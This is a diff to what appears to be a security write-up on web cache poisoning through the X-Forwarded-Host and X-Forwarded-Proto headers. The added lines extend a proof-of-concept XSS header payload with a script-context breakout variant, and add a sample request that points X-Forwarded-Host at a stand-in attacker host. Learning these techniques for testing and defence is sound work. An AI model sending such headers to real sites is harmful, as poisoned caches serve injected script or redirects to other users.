@@ -69,7 +69,7 @@ We can see that the value of the `X-Forwarded-Host` is used to generate an `Open
 **XSS Exploitation :**
 
 ```
-X-Forwarded-Host: a."><script>alert(1)</script>"
+X-Forwarded-Host: a."><script>alert(1)</script>" / someString"-alert(1)-"someString
 ```
 
 ```
@@ -111,9 +111,15 @@ Original Request:
 ```
 GET /random HTTP/1.1
 Host: evil-site.com
-X-Forwarded-Proto: http
+X-Forwarded-Proto: http 
+
 ```
 
+```
+GET /random HTTP/1.1
+X-Forwarded-Host: evil-user.net
+X-Forwarded-Proto: nothttps OR x-forwarded-scheme
+```
 Server Response:
 
 ```
